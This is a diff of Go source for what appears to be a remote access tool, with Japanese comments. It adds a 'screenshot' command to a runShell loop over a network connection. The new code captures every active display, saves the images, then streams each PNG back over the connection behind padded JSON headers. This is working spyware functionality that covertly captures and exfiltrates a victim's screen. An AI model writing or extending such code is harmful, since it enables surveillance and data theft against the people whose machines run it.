@@ -5,6 +5,7 @@ import (
 	"bytes"
 	"crypto/rand"
 	"crypto/tls"
+	"encoding/json"
 	"errors"
 	"flag"
 	"fmt"
@@ -40,8 +41,19 @@ func genNumStr(len int) string {
 	return container
 }
 
+func padString(source string, toLength int) string {
+	currLength := len(source)
+	remLength := toLength - currLength
+
+	for i := 0; i < remLength; i++ {
+		source += ":"
+	}
+	return source
+}
+
 //TODO outputDirを指定
 //スクリーンショットを撮影
+//conn net.Conn
 func getscreenshot() ([]string, error) {
 	n := screenshot.NumActiveDisplays()
 	filenames := []string{}
@@ -60,7 +72,7 @@ func getscreenshot() ([]string, error) {
 				fpth = `/tmp/`
 			}
 		*/
-		fpth = "./"
+		fpth = "./screenshot/"
 		fileName := fmt.Sprintf("Scr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
 		fullpath := fpth + fileName
 		filenames = append(filenames, fullpath)
@@ -71,6 +83,7 @@ func getscreenshot() ([]string, error) {
 
 		defer file.Close()
 		png.Encode(file, img)
+		//png.Encode(conn, img)
 
 		//fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
 	}
@@ -159,19 +172,91 @@ func runShell(conn net.Conn) {
 			conn.Write([]byte("Upload Success"))
 
 		case "screenshot": //ex: screenshot
+			//TODO io.Writerに直接書けない？
 			//スクリーンショットを撮影し送信
 			filenames, err := getscreenshot()
+			fmt.Println(filenames)
 			if err != nil {
 				//エラーを返す
 				continue
 			}
-			for _, f := range filenames {
-				//書き込み
-				//構造体にして送る？
-			}
+
 			//終了通知
 			//空の名前、中身で終了
 			//screenshot fin
+			fin := utils.Output{Type: utils.FIN}
+			j, err := json.Marshal(fin)
+			if err != nil {
+				continue
+			}
+			fmt.Println(string(j))
+			conn.Write(j)
+
+			for _, fname := range filenames {
+				//sendFile
+				f, err := os.Open(fname)
+				if err != nil {
+					log.Fatalln(err)
+					break
+				}
+
+				//書き込み
+				//構造体にして送る？
+				fstats, err := f.Stat()
+				if err != nil {
+					log.Fatalln(err)
+					break
+				}
+				name := strings.Split(fname, "/")[2]
+				fileinfo := utils.FileInfo{Name: name, Size: fstats.Size()}
+				output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}
+				j, err := json.Marshal(output)
+				if err != nil {
+					log.Fatalln(err)
+					break
+				}
+				//serverでは、Unmarshalできなくなったら終了
+				fmt.Println(string(j))
+				_, err = conn.Write([]byte(padString(string(j), 1024)))
+				if err != nil {
+					log.Fatalln(err)
+					break
+				}
+
+				//time.Sleep(1 * time.Second)
+
+				/*
+					body, err := io.ReadAll(f)
+					if err != nil {
+						log.Fatalln(err)
+						break
+					}
+					fmt.Println(string(body))
+				*/
+				//conn.Write(body)
+
+				/*
+					sendBuff := make([]byte, 1024)
+					for {
+						n, err := f.Read(sendBuff)
+						if err != nil {
+							break
+						}
+						conn.Write(sendBuff[:n])
+					}
+				*/
+
+				//fileInfoのWriteが消されてしまう
+
+				_, err = io.Copy(conn, f)
+				if err != nil {
+					break
+				}
+
+				f.Close()
+			}
+
+			fmt.Println("screenshot finished")
 
 		case "download": //ex: download [path]
 		//ファイルシステム構築
